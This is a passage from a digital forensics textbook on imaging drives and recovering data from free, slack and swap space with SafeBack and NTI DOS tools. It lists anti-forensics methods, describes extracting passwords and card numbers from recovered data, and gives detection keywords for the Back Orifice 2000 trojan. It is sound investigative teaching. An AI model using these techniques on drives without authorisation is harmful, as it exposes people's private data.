*   [https://www.nist.gov/itl/ssd/software-quality-group/computer-forensics-tool-testing-program-cftt/cftt-technical/disk](https://www.nist.gov)

and additional information at:

*   [https://www.dhs.gov/science-and-technology/nist-cftt-reports](https://www.dhs.gov)

It can also be a good idea at times to discover the same evidence using more than one tool for verification purposes. Kali provides us with the ability to do that.

It’s not all roses though. There are also numerous tools available to thwart forensics investigations. Some of these are as follows:

*   The newer solid state drives (SSDs) are far more efficient at data deletion than magnetic drives
*   Tor Browser
*   Encryption 
    *   PGP
    *   TrueCrypt
    *   BitLocker
    *   VeraCrypt … to name a few
*   Anonymous Internet access at coffee shops (and similar shops) globally
*   VPNs 
    *   Globally there are numerous VPN providers who will either not cooperate with law enforcement or don’t have to cooperate with law enforcement due to local laws
    *   Numerous providers keep no logs or logs for only a short period of time (many less than a month)

Now back to a Kali Linux focus for a bit. There are other books, videos, etc. that provide the details of downloading and installing Kali. That’s not the focus of this book but I’ll just hit a few highlights.

You can download Kali from: [https://www.kali.org/downloads/](https://www.kali.org)

This will provide you with the ISO image from which you can install and set up Kali. If you don’t have a separate machine to place Kali on, you can use a tool such as VirtualBox and run Kali as a VM. You can make use of software like Rufus or UNetbootin to install Kali onto various removable storage media, such as a flash drive, external hard disk, or an SD card. VirtualBox can be located at: [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org)

Besides on your laptop or desktop, you should install Kali on an SD card or a flash drive to assist you during an investigation. You can either use UNetbootin ([http://unetbootin.github.io/](http://unetbootin.github.io)) or Rufus ([https://rufus.ie/](https://rufus.ie)). There are other choices but these will suffice.

A key point to remember before acquiring a forensic image (bitstream backup/copy) of a hard drive is to use a write blocker to protect the drive you are acquiring from being contaminated during your endeavors.

It does depend on your situation and the environment you are working in, but if possible, my preference is to use a FRED Forensic Workstation from Digital Intelligence:

*   [https://digitalintelligence.com/store/products/fred](https://digitalintelligence.com)

In conjunction with FRED, I also prefer the UltraKit from Digital Intelligence:

*   [https://digitalintelligence.com/store/products/w3008](https://digitalintelligence.com) 
    *   Contains write blockers, adapters, connectors, etc. and can be customized as needed

We may need to show proof (depends on whom you are doing the work for) that the evidence has not been tampered with by making a hash of the evidence. One way to do this (an example) is to make use of the md5sum command:

*   md5sum <path/drive>
*   md5sum /dev/sda

Let’s first start with some tools that have been around for decades and are available globally. You could choose to use either SafeBack or EnCase to obtain the bitstream backup. In this case, you choose SafeBack. You look on the back of the system and see that there is a parallel port but no SCSI (Small Computer Systems Interface) port. The bitstream backup of the hard drive will take much less time if a SCSI connection can be used instead of the parallel port. Therefore, also go through the process of installing a SCSI card in the victim system. (I always carry a SCSI card as part of a standard toolkit.) The steps taken are as follows:

1.  Pull the power plug from the back of the computer (not from the wall).
2.  Look carefully for booby traps (unlikely, but possible) as you open the case of the computer. Look inside for anything unusual. Disconnect the power plugs from the hard drives to prevent them from accidentally booting.
3.  Choose a SCSI card. The SCSI card I prefer to use for Microsoft Windows-based systems that have a PCI bus is the Adaptec 19160 because of its high performance and reliability. Adaptec 19160 comes with EZ-SCSI software, and updated driver software can be obtained automatically over the Internet. Adaptec rigorously tests its card with hundreds of SCSI systems. I have never had a problem with one of its cards, so I highly recommend them. The card has a five-year warranty and free technical support (if I need help with configuration, etc.) for two years. It is a great bargain. (Just so you know, Adaptec has no idea I am saying good things about its product; I am just impressed with it.)
4.  Now install the SCSI card into an open 32-bit PCI expansion slot in the victim system. Read the small manual that comes with the SCSI card. Remove one of the silver (usually) expansion slot covers. Handle the card carefully. It is inside a static protection bag. Be sure to discharge any static electricity from your body before handling the card to avoid damaging it. Do this by touching a grounded metal object (such as the back of a computer that is plugged in). PCI expansion slots are normally white or ivory colored. Once the card clicks in place (you may have to press down somewhat firmly), use the slot cover screw that you had to remove to secure the card in place.
5.  Plug the system power cable back into the back of the computer.
6.  Insert the DOS boot diskette and power up the computer. I will discuss this boot diskette for a moment. The DOS boot diskette is a diskette that goes in the A: drive of the target system *(Note:* This boot medium could just as easily be on a CD-ROM, Jaz, or Zip disk. What you use depends on what is available to you on the target system.) I will discuss the contents of this boot diskette shortly.
7.  Turn on the system and press the proper key to get into the CMOS BIOS area. On some systems the proper key to press is displayed on the screen. If not, some common keys to get into the CMOS BIOS area are: 
    *   Dell computers   F12
    *   Compaq         F10
    *   IBM            F1
    *   PC clones       Delete, Ctrl-Alt-Esc, Ctrl-Alt-Enter
8.  Run the CMOS setup and ensure that the computer will boot first from the diskette. While in the CMOS BIOS setup, note the time and compare it to the time on your watch. Make a note of any difference for future reference with your own time keeping and the times that are running on other systems (such as router time, firewall time, etc.). The NTI forensics utility “gettime” may also be used before beginning the evidence collection process (bitstream backup) if preferred.
9.  Exit the CMOS BIOS routine and save changes.
10.  Let the computer now continue to boot itself from the diskette. Now you know that the system will boot first from your diskette and will not boot from the system hard drive.
11.  Power off the computer, disconnect the power cable from the back of the computer, and reconnect the hard drive power cables.
12.  Put the cover back on the computer and plug the power cable back into the computer. Do not turn the computer back on yet.
13.  Choose a medium to back up the victim’s hard drive. In this example, I will use the Ecrix VXA-1 tape drive. (I highly recommend this tape backup unit. Learn more about this tape drive by going to [http://www.ecrix.com](http://www.ecrix.com). Each tape for Ecrix holds up to 66 GB of data, and the maximum data transfer rate is around 6 MB/sec.)
14.  Place a SCSI terminator on the bottom SCSI connection of the Ecrix tape drive. Be sure there are no SCSI ID conflicts. (Read the short manuals that come with the Ecrix tape drive and the Adaptec SCSI card for more information. You probably will not have to do anything, but read them just in case.)
15.  Connect the 50-pin SCSI cable from the back of the Ecrix tape drive to the Adaptec SCSI card external connector on the back of the victim system.

With the following changes to the standard SCSI settings, Ecrix VXA-1 works excellently with SafeBack. Do not start yet. Follow these steps when I actually tell you to boot the system with your boot diskette:

1.  When your system boots, wait for the “Press Ctrl-A for SCSI Setup” message to appear, and then press Ctrl-A.
2.  When the SCSI setup menu appears, choose “Configure/View Host Adapter Settings.”
3.  Then choose “SCSI Device Configuration.”
4.  Set “Initiate Sync Negotiation” to NO for all SCSI IDs.
5.  Set “Maximum Sync Transfer Rate” to 10.0 for all IDs.
6.  Set “Enable Disconnection” to NO for all IDs.
7.  Press “Esc” and save all changes.

The boot diskette I will use needs to contain some basic DOS commands, Ecrix and Adaptec software drivers, SafeBack’s master.exe file that runs SafeBack, and a few other forensic tools. The DOS boot diskette I am creating will also work with Jaz Drives and Zip Drives (as well as the Ecrix tape drive I am using). To create your DOS boot diskette (which you would have done before coming to the client site):

1.  Place the diskette in the A: drive of a system you know and trust and type “format a:/s” (do not type the quotes) from the DOS command line prompt.
2.  Once the formatting is complete, load the following files on the diskette: 
    *   config.sys, autoexec.bat, master.exe, aspi8u2.sys, guest.ini, himem.sys, fdisk.exe,
    *   format.com, smartdrv.exe, restpart.exe, aspiatap.sys, aspippm2.sys, advaspi.sys,
    *   aspicd.sys, aspippml.sys, guest.exe, aspil6l6.sys, nibble2.ilm, nibble.ilm,
    *   aspiide.sys, aspi8dos.sys, drvspace.bin, driver.sys., crcmd5.exe, disksig.exe,
    *   doc.exe, filelist.exe, getfree.exe, getslack.exe, getswap.exe, gettime.exe.
    *   Some of these files are not necessary, but I have found them to be helpful in the past so will I include them. Where do you obtain these files? The DOS commands/drivers may be obtained from a trusted machine in the c:\\windows and c:\\windows\\command directories. The driver files and some of the executables may be obtained from the media provided with the Adaptec SCSI card and from Ecrix and Iomega media provided with those products. You may also obtain files from their respective websites. The autoexec.bat file mentioned above should contain the following statement: 
        
        *                smartdrv
        
        The config.sys file mentioned above should contain the following statements:  
        files=30  
        buffers=8  
        lastdrive=z  
        dos=high,umb  
        device==himem.sys  
        device=aspi8u2.sys/D
3.  Now place your boot diskette (be sure it is virus free) into the victim machine, turn on the system, and watch the system prompts as they display on the screen. 
    1.  a. When the system boots, wait for the “Press Ctrl-A for SCSI Setup” message to appear, and then press Ctrl-A.
    2.  b. When the SCSI setup menu appears, choose “Configure/View Host Adapter Settings.”
    3.  c. Then choose “SCSI Device Configuration.”
    4.  d. Set “Initiate Sync Negotiation” to NO for all SCSI IDs.
    5.  e. Set “Maximum Sync Transfer Rate” to 10.0 for all IDs.
    6.  f. Set “Enable Disconnection” to NO for all IDs.
    7.  g. Press “Esc” and save all changes.
    8.  h. Let the system continue to boot to a DOS prompt.
4.  Start SafeBack (run the master.exe program that is on your diskette).
5.  Enter audit file name. (It cannot be the same location where your evidence will go.)
6.  Choose these settings in SafeBack:  
    Backup, Local, No Direct Access, Auto for XBIOS use, Auto adjust partitions,  
    Yes to Backfill on restore, No to compress sector data.
7.  Now select what is to be backed up using arrow keys, space bar, and appropriate letters, and then press <Enter> when done.
8.  Enter the name of the file that will contain the backup image.
9.  Follow prompts as required.
10.  Enter text for the comment record. Include information on the case, the machine, and unusual items or procedures.
11.  Press “Esc” when done with text comment record. The bitstream backup will now begin.

When the backup is completed, “Esc” back to the proper screen and perform a Verify operation on the evidence file you just made. Be sure to immediately make a duplicate of the disks/tapes before leaving the client site. Do not keep duplicate backup tapes in the same container. Send one to your lab via DCFL guidelines ([http://www.dcfl.gov](http://www.dcfl.gov)) and take the other copy of the evidence with you to your analysis lab.

Now, be sure to run DiskSig from NTI to obtain a CRC checksum and MD5 digest of the victim hard drive. See the section on DiskSig for more information. This will take time, depending on the size of the victim’s hard drive.

It takes hours for the bitstream backups to be made. What should you do in the meantime?

First, ensure that your bitstream backup will be secure while the process is ongoing. As long as it is secure, discuss the network topology diagram with the network infrastructure experts. If possible, take a physical walkthrough of the infrastructure. Follow the cables from the victim system to the ports, switches, routers, hubs – to whatever the system is connected. System/infrastructure experts at the client site will help you collect log information from relevant firewalls, routers, switches, etc.

Be sure to always maintain chain of custody for all evidence collected and keep the evidence in a secured area that has proper access controls.

[Chapter 4](#c4.xhtml#c4) will cover details related to various evidence collection and analysis tools that are widely used in the industry, primarily tools from Guidance Software ([http://www.guidancesoftware.com](http://www.guidancesoftware.com)) and NTI ([http://www.forensics-intl.com](http://www.forensics-intl.com)). The forensic tools from NTI are DOS based, have been in use by both law enforcement and private firms for many years, and are well tested in the court system. On the other hand, EnCase from Guidance Software is a relative newcomer on the scene. EnCase evidence collection is DOS based (although the Preview Mode can be used in Microsoft Windows to look at a hard drive before initiating the DOS-based evidence collection activity), but the analysis tools are Microsoft Windows based (a collection of tools running under Microsoft Windows that makes the analysis effort easier).

## Questions

*   1\. State Locard’s Exchange Principle.
*   2\. To what website should you go to review computer search and seizure guidelines that are acceptable in a court of law? Which constitutional amendment applies here?
*   3\. List, in order, the six investigative techniques used by the FBI.
*   4\. What tools could be used to obtain a bitstream backup of a computer hard drive?

# Chapter 4 Evidence collection and analysis tools

DOI: [10.1201/9781003134817-4](https://doi.org/10.1201/9781003134817-4)

Many evidence collection and analysis tools are commercially available. A description of several reliable ones is provided in this chapter. I’m still maintaining some of the older tools in this newer version since they are still being used in various parts of the world.

## Safe back

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

Upon your initial arrival at a client site, obtain a bitstream backup of the compromised systems. A bitstream backup is different from the regular copy operation. During a copy operation, you are merely copying files from one medium (the hard drive, for instance) to another (e.g., a tape drive, Jaz Drive, etc.). When performing a bitstream backup of a hard drive, you are obtaining a bit-by-bit copy of the hard drive, not just files. Every bit that is on the hard drive is transferred to your backup medium (another hard drive, Zip Drive, Jaz Drive, tape). If it comes as a surprise to you that hidden data exists on your hard drive (i.e., more is present on the hard drive than just the file names you see), then you are about to enter a new world, the world of the CyberForensic Investigator (CFI).

The procedure to use SafeBack in conjunction with the Iomega Zip Drive follows. This same procedure can be used for Jaz Drives, tape drives, etc. However, you will have to load different drivers (software modules) on your boot disk.

First create a boot disk. To do so, place a diskette in the floppy drive of the computer you are using and perform these steps (co = click once with your left mouse button; dc = double-click with your left mouse button; m = move your mouse pointer to):

 co Start

 m Programs

 co MS-DOS Programs

 Now you see: c: \\ (or something similar).

 Now type the command: format a: / s.

Follow the prompts. (No label is necessary, but you may give it one when asked if you wish.)

Now a formatted diskette is ready. From your NTI SafeBack diskette, copy the following files to the formatted diskette:

 Master.exe

 Respart.exe

From your Iomega Zip Drive CD-ROM, copy the following files to the formatted diskette:

 advaspi.sys

 aspil616.sys

 aspi8dos.sys

 aspiatap.sys

 aspiide.sys

 aspippml.sys

 aspippm2.sys

 nibble.ilm

 nibble2.ilm

 guest.exe

 guest.ini

 guesthlp.txt

 smartdrv.exe

On the formatted diskette, set up an autoexec.bat file (c: \\edit a: \\ autoexec.bat <enter>) containing the following:

 smartdrv.exe

 doskey

 guest

Save the file (Alt-F-S); exit the program (Alt-F-X).

Turn off the computer and connect the Zip Drive via a SCSI or parallel connection (whichever type you have). Connect power to the Zip Drive.

With your diskette in the computer’s diskette drive, turn on the computer. The computer will boot from the diskette and show some initial bootup messages. When the bootup completes, there should be a message on the screen telling you which drive letter has been assigned to your Zip Drive. I will assume the drive letter assigned to the Zip Drive is D. If your drive letter is different, replace the d: with your assigned drive letter.

Now run SafeBack from the diskette in your A: Drive. Type the following:

 a: <enter>

 master <enter>

**Remember**: If you need additional help for any of the screens that come up, press FI and additional information pertaining to the screen will be provided.

You will first be asked to enter the name of the file to which the audit data will be written. You can choose any name, but it is best to pick a name that is significant in relation to the client site and the computer you are backing up. Press <enter> after you type in your filename to move on to the next screen.

Notice that there are choices to be made here. Again, use FI to learn more about each choice. Use the arrow keys to move to the various selections. A red background will indicate the choice currently selected. When you have made a selection on each line, do not press <enter>; use the down arrow to go to the next line and make another selection, etc. Make the following selections:

*   Function: Backup
*   Remote: Local
*   Direct Access: No
*   Use XBIOS: Auto
*   Adjust Partitions: Auto
*   Backfill on Restore: Yes
*   Compress Sector Data: No
*   Now press <enter>.

This brings you to the drive/volume selection screen. Press FI to get more information about this screen. Select the drives/volumes you want to back up to the Zip Drive. See the legend for the keys you should press to make your selection. After making your selection(s), press <enter> to move on to the next screen.

You are now asked to enter the name of the file that will contain the backup image of the drive/volume you are backing up. Use a name that is meaningful to you. Press <enter> when you have done this to get to the next screen.

You are now asked to enter your text comments. Press FI for more information. Press Esc (not <enter>) when you have completed your comments. SafeBack now begins the backup process. Depending on the size of the drive/volume being backed up, you may be asked to put in additional Zip Disks at certain intervals. Do so when the request occurs. Be sure to label the Zip Disks so you do not get them mixed up.

When you have completed the backup process, use the SafeBack “Verify” option (instead of the backup option you chose the first time) to verify that nothing is wrong with your backup. Once verified, make an additional copy of the backup Zip disks. One copy is your evidence copy that will be kept in a secure location (to maintain proper chain of custody) and the other is your working copy, the one on which you will use other CF analysis tools.

Now use the “Restore” function (again, instead of the “Backup” function that you used earlier) to restore the Zip backups you made to a hard drive on another computer (the computer to be used to perform your analysis). Use the same process for connecting the Zip Drive to the analysis computer (AC) and boot the AC with your boot diskette. When it has booted, go through the same SafeBack startup process (Master <enter>) and this time choose the “Restore” function and follow the prompts. Use FI to get more help if needed.

Now, the SafeBack image file has been restored to your AC. I will now move on to other CF tools to perform analysis.

## GetTime

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

GetTime is used to document the time and date settings of a victim computer system by reading the system date/time from CMOS.compare the date/time from CMOS to the current time on your watch or whatever timepiece being used. Do this before processing the computer for evidence.

To run GetTime, do the following:

 gettime <enter>

When you did this, a text file was generated named STM-1010.001. Print out this document (or bring it up in a text editor, such as Microsoft Word) and fill out the date/time from the timepiece being used (your watch, a clock, etc.).

## FileList, FileCnvt, and Excel

*   *New Technologies, Inc*.
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

Now that you have restored your bitstream backup to drive C of your analysis computer (AC), use FileList to catalog the contents of the disk. FileCnvt and Excel are used to properly read the output of the FileList program.

First type FileList by itself at a DOS prompt:

 filelist <enter>

This provides you with the syntax for this program. Take a little time to study the command syntax shown. I will not take advantage of all the options provided in our example.

 filelist/m/d a:\\DriveC C: <enter>

The above statement will catalog the contents of c:, perform an MD5 computation on those contents (/m), contain only deleted files from drive C (/d), and place the results in the file a:\\DriveC.

Now do the following:

 dir/od a: <enter>

Note the files DriveC.L0l and DriveC.L99. Because DriveC.L99 is zero bytes in length (column 4 in the DOS window), delete it with the command:

 a:\\del DriveC.L99 <enter>

This leaves the DriveC.L01 file. This file contains your cataloged data of drive C. This file cannot be used directly. Run FileCnvt first. With both FileCnvt and DriveC.L01 in the same directory, type the following:

 filecnvt <enter>

If more than one file is shown, choose DriveC.L01 with the arrow keys and press <enter>. You are asked to enter a unique name to describe the computer or client you are working with. Enter a name of your choice and press <enter>. You are told that DriveC.dbf (a database file) has now been created. Clear the computer screen using the command:

 cls <enter>

Now run Microsoft Excel. (You may use any other program that reads.dbf files. I will assume you are using Excel.) Open the DriveC.L01 file. You will see three columns of information. Column 3 provides the filenames of the deleted files (because you chose to use the /d option).

To see the difference, now run FileList without the /d option:

 filelist a:\\DriveC c: <enter>

 fileenvt <enter>

Look at the results in Excel.

You now have a spreadsheet that can be sorted and analyzed using standard Excel commands. Using FileList, it is simple to review the chronology of usage on a computer hard drive, several computer hard drives, or an assortment of diskettes.

## GetFree

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Now we want to obtain the content of all unallocated space (deleted files) on drive C of your AC and place this data in a single file. This single file can be placed on a diskette (or Zip Disk if more space is needed).

You can type the following to see the syntax of this program:

 getfree <enter>

To estimate the amount of filespace needed to hold the unallocated space, use the command:

 getfree C: <enter>

Near the bottom of the results of this command, we see “A total of xxx MB is needed.” Replace the xxx with whatever value your system shows you. Let us say that xxx = 195. This means one 250-MB Zip Disk could be used to hold the 195 MB of data. Let us say that our Zip Drive is drive D. Therefore, we would use the following command:

 getfree/f d:\\FreeC c: <enter>

The /f option allows us to filter out non-printing characters. Later in the investigation, we may want to run GetFree without the /f, but to start, this is fine. The d:\\FreeC is the Zip Drive (d:) and the FreeC is the filename chosen in which to place the unallocated space data. The c: is the drive we are looking on for unallocated space.

Now, any files that were deleted from drive C are in a single file (FreeC). This may provide some excellent data related to the case we are working on.

## Swap files and GetSwap

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

If the bitstream backup that is on drive C of your AC is a Microsoft Windows operating system or any other operating system that contains static swap files, you will want to copy these swap files to your Zip Drive (drive D).

If this is a Microsoft NT system (or Windows 2000, which is essentially NT 5), copy the pagefile.sys file to a separate Zip Disk(s). You must do this copy operation in DOS mode (not a DOS window running under NT) because while Windows NT is running, the pagefile.sys file is being used and you cannot perform the copy.

To perform this copy operation, go to the directory where pagefile.sys resides (usually c:\\winnt\\system32\\) and, assuming your Zip Drive is drive D, use the following command:

 c:\\winnt\\system32\\copy pagefile.sys d: <enter>

For systems such as Microsoft Windows 95 or 98, look for win386. swp in c:\\windows. Perform the same type of copy operation under DOS:

 c:\\windows\\copy win386.swp d: <enter>

Under other Microsoft Windows systems, look for a file called 386SPART.PAR and perform the same type of copy operation to your Zip Drive under DOS.

There are a number of other operating systems with a variety of different swap files. See the documentation for the operating system you are using to obtain the names and locations of these swap files.

Now let us discuss the use of GetSwap. The purpose of GetSwap is to obtain data found in computer “swap” or “page” files, so that the data can later be analyzed during an investigation. GetSwap will obtain all such data from one or more hard drive partitions in a single pass. Because of the way swap space works, a document could have been created, printed, and never “saved” but still be in swap space. Valuable data can be obtained from swap space. GetSwap must be run under DOS, not MS Windows. Therefore, boot your system to DOS by using either a boot diskette or choosing MS-DOS at startup before using GetSwap.

To read the manual for GetSwap from a DOS prompt, use:

 getswap man | more <enter>

To find out what types of partitions you have on the drives (FAT, NTFS), use:

 getswap id <enter>

If you use the /F option with GetSwap (getswap d:\\SwapInfo C: / f), the size of the swap file can be significantly reduced by filtering out the binary data and leaving only the ASCII text data to be analyzed. This is good for a first pass. If you do not find what you are looking for, you can always run GetSwap again without the /F so that you then have the binary data to analyze also.

If you want to obtain all swap data (binary and ASCII text) from C and place the resulting swap file data on your Zip Drive (D) in a file named SwapData, use the following command:

 getswap d:\\SwapData C:

If you do not have additional drives to obtain swap data from, such as drives E, F, and G, use the following command:

 getswap d:\\SwapData C: E: F: G:

GetSwap would search all the above drives for swap data and place the information it found into d:\\SwapData. Later, other tools will be used to analyze the swap data we have collected in the file SwapData.

To run GetSwap, type:

 GETSWAP <Enter>

The command syntax of the GetSwap command is:

 GETSWAP <Filename> <Volume:> \[<Volume:> <Volume:>..\] \[/F\]

**Note**: The path can be included with the filename. The filename you specify will contain the swap data that is obtained from the volume(s) you search. The /F may be added to filter out binary data and leave only the ASCII text. You may look at ASCII text first if you wish, but remember that binary data may contain important information.

To show a list of the hard drive volumes that are recognized by GetSwap, type:

 GETSWAP ID

To see the GetSwap manual, type:

 GETSWAP MAN | MORE

To use GetSwap, type:

 get swap c:\\D\_Swap D:

This will obtain the swap data from drive D and place the results in the file:

 c:\\D\_Swap.

GetSwap will obtain data from both NTFS and FAT-type partitions. The purpose of GetSwap is to retrieve data found in swap or page files of computer systems. From these, you can search, process, and analyze the data as you wish during an investigation. Swap file data is stored in computer memory (virtual memory, i.e., – areas of the computer’s hard drive). Because of this, the hard drive contains data that would normally never be on the hard drive but only in RAM (random access memory).

## GetSlack

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Intl.com](http://www.forensics-intl.com)*

GetSlack will be used to capture the data contained in the file slack of the hard drive on our AC (drive C in our case). The file we create that contains the file slack will be placed on the Zip Drive (drive D).

Files fill up one or more clusters on a hard drive. Whatever portion of a cluster that the file does not completely fill up is called slack space. Slack space is used by the operating system for various things, but the ordinary computer user cannot view it. Special tools are required to view slack space. Valuable information pertaining to an investigation can be found here.

To observe the command syntax, type:

 getslack <enter>

To estimate how much slack space is on drive C, type:

 getslack c: <enter>

When this command has completed, you will see (near the bottom) a statement such as “A total of xxx MB of slack space is present,” with xxx being the amount of slack space on the drive you are checking.

To actually obtain the slack space from drive C and place it on Zip Drive D, type:

 getslack d:\\C\_Slack C: <enter>

If we wanted to do the same thing as above but also wanted to filter out nonprintable characters, we would type the following:

 getslack/f d:\\C\_Slack C: <enter>

## Temporary files

When working with a Microsoft Windows operating system, copy the Windows temporary files to your Zip Drive D. These files have a.tmp extension. The easiest way to find these files is as follows:

1.  Click on Start with the left mouse button.
2.  Move the mouse pointer to Find.
3.  Click on Files or Folders.
4.  Place \* .tmp in the Named: box.
5.  Leave the Containing Text: box blank.
6.  Place c:\\ in the Look in: box.
7.  A checkmark should be in the Include subfolders box.
8.  Click on the Find Now box with the left mouse button.

Notice that Column 4 indicates that you have found all of the .tmp files on drive C. The easiest way to copy all of these files to your Zip Drive D is:

1.  Click once with your left mouse button on the first file in the Name column.
2.  Scroll down to the bottom of the file list using the scroll bar on the right side.
3.  Press the Shift key; then click once with the left mouse button on the last file.
4.  All files in the Name column are now highlighted.
5.  Now place the mouse pointer on any highlighted file and press the right mouse button.
6.  Select Copy with the left mouse button.
7.  Minimize all open windows.
8.  Double-click on the My Computer icon.
9.  Right-click once on the drive D icon.
10.  Select Paste with the left mouse button.

You have now placed the .tmp files on your Zip Drive D. Later you will perform an analysis on these .tmp files with your CF tools.

### Filter\_I

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Filter\_I has the ability to make binary data printable and to extract potentially useful data from a large volume of binary data. Another excellent use for this tool is to aid in the creation of a keyword list for use with another CF tool, TextSearch Plus.

This tool will be used to analyze the data you collected from free space (using GetFree), swap space (using GetSwap), slack space (using GetSlack), and temporary files. To use FilterJ, first type the following from a DOS prompt:

 filter\_I <enter>

You will notice a menu with four options to choose from. Use the arrow keys to move between the options and press <enter> to activate the desired option. For each option you highlight, press FI for additional information. The four options are as follows:

#### Filter

The Filter option analyzes the file selected and replaces all non-ASCII data with spaces. The file size will remain the same and the resulting file can be viewed with a word processor such as Microsoft Word.

Use this option on each of the files you collected on your Zip Drive D (FreeC, SwapData, C\_Slack, .tmp files). Ensure that Filter\_I and the files you will analyze (FreeC, SwapData, C\_Slack, .tmp files) are in the same directory. This means either that Filter\_I is loaded on your Zip Disk on drive D that contains the files you collected or that you move the collected files to the location from which you are running Filter\_I. Proceed as follows:

1.  Using the arrow keys, select the Filter option.
2.  Select your SwapData file using your arrow keys and <enter>.
3.  Answer Y (yes) to the request to create the SwapData. F0l file. Once the processing is complete, you are told that SwapData.f01 was created.
4.  Press a key to return to the Filter\_I selection menu.

Now open another DOS window and go to the directory containing the SwapData.f0l and your original SwapData files. Notice that they are still the same size. Take a quick look at both files, using either the DOS more command or a word processor such as Microsoft Word. You will not notice much (if any) difference between the two files because when you made the original SwapData file, parameters were used to exclude any binary data. Because the binary data is already gone, there is nothing for the Filter option to do in this case. Had we not already removed the binary data, Filter would have done so. Now process the C\_Slack file:

1.  Using the arrow keys, select the Filter option.
2.  Select your C\_Slack.s01 file using the arrow keys and <enter>.
3.  Answer Y (yes) to the request to create the C\_Slack.f01 file. Once the processing is complete, you are told that C\_Slack.f01 was created.
4.  Press a key to return to the Filter\_I selection menu.

Look at the two files and notice the difference between them: all non-ASCII data has been replaced with spaces.

#### Intel

The Intel option analyzes the file you select and obtains data that matches English word patterns. You may find passwords, user IDs, Social Security numbers, telephone numbers, credit card numbers, etc. This file size will be much smaller than the file size of the original file. The output of this option is ASCII data. A word processor such as Microsoft Word may be used to view the output file from this option.

Now run the Intel option on your C\_Slack.s01 file. Proceed as follows:

1.  Select the Intel option with the arrow keys and press <enter>.
2.  Choose C\_Slack.s01 with the arrow keys and press <enter>.
3.  Answer Y (yes) to the request to create C\_Slack.f02. Once the processing is complete, you are told that C\_Slack.f02 was created. (Notice that .f 02 is created, not .f 01. You already have a C\_Slack.f 01.)
4.  Press a key to return to the FilterJ selection menu.

Now look at the C\_Slack.f02 file that was created. See if there are words to use for your keyword list that you will use later in TextSearch Plus. Follow the same process used for C\_Slack.s01, but instead use your SwapData.f0l file. You will end up with a SwapData.f02 file to look through to find more keywords for later use.

#### Names

The *Names* option analyzes the file you select and obtains the names of people listed in the file. Any names found here should be added to the keyword list you will generate later using TextSearch Plus. Only ASCII data is held in the output file, so a word processor such as Microsoft Word may be used to view the output file that results from this option.

Now run the Names option on your SwapData.f01 file. Proceed as follows:

1.  Select the Names option with the arrow keys and press <enter>.
2.  Choose SwapData.f01 with the arrow keys and press <enter>.
3.  Answer Y (yes) to the request to create SwapData.f03. Once the processing is complete, you are told that SwapData.f03 was created.
4.  Press a key to return to the Filter\_I selection menu.

Now take a look at the SwapData.f03 file that was created. See if there are words to use for your keyword list that you will use later in

TextSearch Plus. Follow the same process for SwapData.f01, but instead use your C\_Slack.s0l file. You will end up with a C\_Slack.f03 file to look through to find more keywords for later use.

##### Words

The Words option analyzes the file you select and obtains fragments of e-mail or word processing documents. This option and the resulting file obtain data that matches English words that are used in a structured sentence. Only ASCII data is retained in the resulting output file, so a word processing program such as Microsoft Word may be used to read the file.

Now run the *Words* option on your SwapData.f0l file. Proceed as follows:

1.  Select the Words option with the arrow keys and press <enter>.
2.  Choose SwapData.f01 with the arrow keys and press <enter>.
3.  Answer Y (yes) to the request to create SwapData.f04. Once the processing is complete, you are told that SwapData.f04 was created.
4.  Press a key to return to the Filter\_I selection menu.

Now take a look at the SwapData.f04 file that was created. See if there are words to use for your keyword list that you will use later in TextSearch Plus. Follow the same process for SwapData.f01, but instead use your C\_Slack.s0l file. You will end up with a C\_Slack.f04 file to look through to find more keywords for later use.

**Remember**: You should also run FilterJ on your temporary files and the free space file obtained from using GetFree. From the files processed in our examples above, eight new files were obtained, each with extensions of .f0l, .f02, .f03, .f04.

### Key word generation

The three steps to obtain keywords for later use in TextSearch Plus are:

1.  Search through the files (.f02, .f03, .f04) for keywords. 
    *   New leads
    *   Potential passwords and user IDs
    *   Names, dates, locations, etc.
2.  Consult with those who have expertise in the area of your particular case. 
    *   Accountants
    *   Engineers
    *   Chemists
    *   Other law enforcement personnel
    *   Internet, etc.
3.  Consider the operating system (UNIX, NT, VAX, etc.), the platform (Intel, DEC Alpha, SUN SPARC, etc.), hacking tools, system error messages, and messages generated by hacking tools or malicious activity.

Usually, common words that would occur during normal use of the machine are not chosen as keywords. It will help to have access to an expert for the type of system you are working with. Experts can help with keywords from this perspective. It is important to remember that if the keywords you have been using so far have not been effective, you may need to expand the keywords to include more common system words, expecting then to spend more time evaluating the results.

The list that follows is by no means exhaustive, but it is an example of keywords I chose from looking through the Intel file (SwapData.f02) generated by Filter\_I. Because your file will have different content, you will have different words. The list is to give you an idea of what to look for:

> Bad, Destroy, Exception, Error, Warning, Critical, Delete, Remove, Terminate, Virus

Again, not exhaustive, here are ten keywords I chose from my Names option file (SwapData.f03) generated by Filter\_I:

> Shawn, Carlsbad, Ronald Dickerson, Ann Arbor, Allentown, Charles Brownerstein, Franklin from IBM, Bonnie Greason, 13 GHZ, allenpcq@odst23.com

Last but not least are ten keywords I chose from my Words option file (SwapData.f04) generated by Filter\_I:

> Abnormal program termination, Unexpected, Runtime error, BackOrifice,
> 
> Attacker, Exploited, Probe, Password, ntruder \[the I was not there\], suspicious

As an example from an operating system point of view, there are keywords to use if you are working with a Microsoft NT operating system that is suspected of being remotely controlled by a malicious individual. Remote control of a Microsoft NT operating system is probably being done by using Back Orifice 2000 (BO2K). If that is the case, use the following keywords:

> Cult, Dead, Cow, BO2K, Back Orifice, BackOrifice, crtdll.dll, msadp32.acm, msacm32.dll

Note the last three keywords in particular: these three files run when BO2K is active on an NT system.

**Remember**: It takes patience and perseverance to search for and use keywords.

## TextSearch Plus

*   *New Technologies, Inc.*
*   *[http://www.Forensics-Inti.com](http://www.forensics-inti.com)*

Start TextSearch Plus using the following command:

 txtsrchp <enter>

Notice that a menu appears with 15 options. Press the F1 key and read the Help information pertaining to each option. Once you have done this, continue reading this text.

